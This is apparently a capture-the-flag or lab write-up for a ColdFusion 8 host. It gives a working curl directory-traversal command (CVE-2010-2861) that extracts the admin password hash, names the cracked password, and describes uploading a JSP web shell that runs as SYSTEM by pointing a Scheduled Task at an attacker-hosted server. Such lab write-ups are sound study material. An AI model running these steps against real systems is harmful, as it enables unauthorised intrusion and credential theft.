# Mike (10.11.1.10)
****
## Enumeration
1. Enumerate running services using `nmap`
```
nmap -sV -sC -Pn 10.11.1.10
```

2. `nmap` detects **Microsoft IIS**  web server running on port **80**.
``` 
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

3. We performed directory enumeration and we got a hit on **2** directories called `/cfdocs` and `/cfide`, which are both a referenced to **Adobe ColdFusion**
![[cfide.png]]

> [!info] 
> `CFIDE` stands for **ColdFusion Integrated Development Environment**
>  `CFdocs` is a reference tool for **ColdFusion Markup Language** (CFML)

4. The admin login page shows that it uses **Adobe Coldfusion 8**. So we should look for reported vulnerabilities on that version.
   ![[coldfusion-8.png]]

5. One of the vulnerabilities we found is [**CVE-2010-2861**](https://nvd.nist.gov/vuln/detail/CVE-2010-2861) which is a **Directory Traversal** vulnerability affecting **9.0.1 and lower** versions of Adobe ColdFusion. Using the vulnerability, we were able to extract the password hash from `password.properties` file which can be found on `C:\ColdFusion8\lib` directory.
   
```
curl -s http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en | grep '^password=' | head -1 | awk -F '=' '{print "\nHash: " $2}'
```

![[cf-hash.png]]

6. The hash `AAFDC23870ECBCD3D557B6423A8982134E17927E` has been cracked before that's why we are able to get the plaintext just simply by using Google search. The plaintext is `pass123`
   
   ![[google-hash.png]]

***
## Exploitation
1. Since we already have the admin password, we can now login to [CFIDE Admin Dashboard](http://10.11.1.10/CFIDE/administrator/index.cfm) 
   ![[cfide-dashboard.png]]

2. We we will going to upload a JSP shell by creating a **Scheduled Task**. But first, we need to spawn a simple HTTP server to host our JSP shell. For this task, we can use python's `http.server`
   
``` 
python -m http.server 80
```
> [!note] 
> Make sure to spawn your HTTP server on the same directory where your JSP shell is located

> [!tip] 
> You may use `SimpleHTTPServer`  if you are using `python2`
> `python2 -m SimpleHTTPServer 80`

3. After spawning an HTTP server, we will proceed on creating a **Scheduled Task**. From the admin dashboard navigate to  `Debugging & Logging` > `Scheduled Tasks` then click on the `Schedule New Task` button
   
   ![[debugging-task.png]]
   
4.   Create a Scheduled Task through the following steps:
	* Set the task name to whatever you like
	* Change the URL to the URL of JSP shell (http://KALI_IP/shell.jsp)
	* Check the option to save the output to a file. 
	*  Paste the path `C:\Inetpub\wwwroot\CFIDE\shell.jsp`  into the 'File' field,
	*  Type the name you want to save the shell as and the extension (jsp). 
	*  Press **OK** and click the green check to run the task.

![[new-shell-task.png]]

5. We should now able to access and execute the shell through  `http://10.11.1.10/CFIDE/shell.jsp`
   
```
curl http://10.11.1.10/CFIDE/shell.jsp
```

![[mike-spawn-shell.png]]
***
## Post-exploitation
1. The shell we have is already running as `nt authority\system`, so we will now be able to read the flag.
   
   ![[mike-flag.png]]